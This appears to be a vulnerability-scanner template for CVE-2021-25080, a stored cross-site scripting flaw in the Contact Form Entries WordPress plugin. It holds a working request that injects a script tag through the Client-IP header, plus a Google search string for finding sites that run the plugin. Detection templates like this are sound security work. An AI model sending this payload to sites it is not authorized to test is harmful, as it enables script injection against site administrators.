id: CVE-2021-25080

info:
  name: Unauthenticated Stored XSS in Contact Form Entries Plugin
  author: ProjectDiscoveryAI
  severity: medium
  description: The Contact Form Entries WordPress plugin before 1.1.7 does not validate, sanitise and escape the IP address retrieved via headers such as CLIENT-IP and X-FORWARDED-FOR, allowing unauthenticated attackers to perform Cross-Site Scripting attacks against logged in admins viewing the created entry.
  impact: |
    Allows remote attackers to execute malicious scripts in the context of a victim's browser
  remediation: |
    Update Contact Form Entries Plugin to the latest version to mitigate CVE-2021-25080
  reference:
    - https://wpscan.com/vulnerability/acd3d98a-aab8-49be-b77e-e8c6ede171ac
    - https://github.com/ARPSyndicate/cvemon
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2021-25080
    cwe-id: CWE-79
    epss-score: 0.0011
    epss-percentile: 0.45613
    cpe: cpe:2.3:a:crmperks:contact_form_entries:*:*:*:*:*:wordpress:*:*
  metadata:
    vendor: crmperks
    product: contact_form_entries
    framework: wordpress
    google-query: inurl:"/wp-content/plugins/contact-form-entries/"
  tags: wpscan

http:
  - method: POST
    path:
      - "{{BaseURL}}/wp-json/contact-form-7/v1/contact-forms/1376/feedback"

    headers:
      Accept: "application/json, */*;q=0.1"
      Accept-Language: "en-GB,en;q=0.5"
      Accept-Encoding: "gzip, deflate"
      Content-Type: "multipart/form-data; boundary=---------------------------9885500162977152723644841236"
      Content-Length: "963"
      Connection: "close"
      Client-IP: "<script>alert(/XSS/)</script>"
      Cookie: "vx_user=61c2ecea43ad6164016458635903967"

    body: |
      -----------------------------9885500162977152723644841236
      Content-Disposition: form-data; name="_wpcf7"
      1376
      -----------------------------9885500162977152723644841236
      Content-Disposition: form-data; name="_wpcf7_version"
      5.5.3
      -----------------------------9885500162977152723644841236
      Content-Disposition: form-data; name="_wpcf7_locale"
      en_US
      -----------------------------9885500162977152723644841236
      Content-Disposition: form-data; name="_wpcf7_unit_tag"
      wpcf7-f1376-p1701-o1
      -----------------------------9885500162977152723644841236
      Content-Disposition: form-data; name="_wpcf7_container_post"
      1701
      -----------------------------9885500162977152723644841236
      Content-Disposition: form-data; name="_wpcf7_posted_data_hash"
      3e8ce0f47face5a3318813e733c3c774
      -----------------------------9885500162977152723644841236
      Content-Disposition: form-data; name="text-42"
      Test
      -----------------------------9885500162977152723644841236--
    matchers:
      - type: word
        words:
          - "<script>alert(/XSS/)</script>"
        part: body
